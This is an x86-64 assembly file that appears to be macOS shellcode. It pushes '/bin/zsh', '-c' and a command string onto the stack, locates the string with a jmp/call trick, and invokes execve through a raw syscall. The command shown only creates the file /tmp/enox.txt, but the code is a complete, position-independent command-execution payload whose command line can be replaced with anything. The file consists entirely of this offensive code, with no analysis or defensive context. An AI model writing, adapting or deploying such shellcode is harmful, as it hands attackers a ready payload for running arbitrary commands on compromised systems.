bits 64

global _main

_main:
    XOR RDX,RDX             ; envp=NULL (RDX - 3rd Argument)

    PUSH RDX                ; PUSH NULL onto RSP (String terminator)
    MOV RBX,'/bin/zsh'      ; STORE /bin/zsh into RBX
    PUSH RBX                ; PUSH /bin/zsh onto RSP
    MOV RDI,RSP             ; fname='/bin/zsh\0' (RDI - 1st Argument)

    PUSH "-c"               ; Place "-c" onto the stack
    MOV RBX,RSP             ; Save argp[1] in RBX
    PUSH RDX                ; argp[3] -> NULL -> RSP
    JMP l_cmd64
r_cmd64:                    ; Call placed pointer to db (argp[2]) -> cmd -> RSP
    PUSH RBX                ; argp[1] -> "-c" -> RSP
    PUSH RDI                ; argp[0] -> "/bin/zsh" -> RSP           
    MOV RSI,RSP             ; argp (RSI - 2nd Argument)

    PUSH 59                 ; Place syscall number on stack
    POP RAX                 ; Place it into RAX
    BTS RAX,25              ; Set 25th bit to 1
    SYSCALL

l_cmd64:
    call r_cmd64            ; Calls r_cmd64 and passes pointer to the below instruction value
    db 'touch /tmp/enox.txt', 0
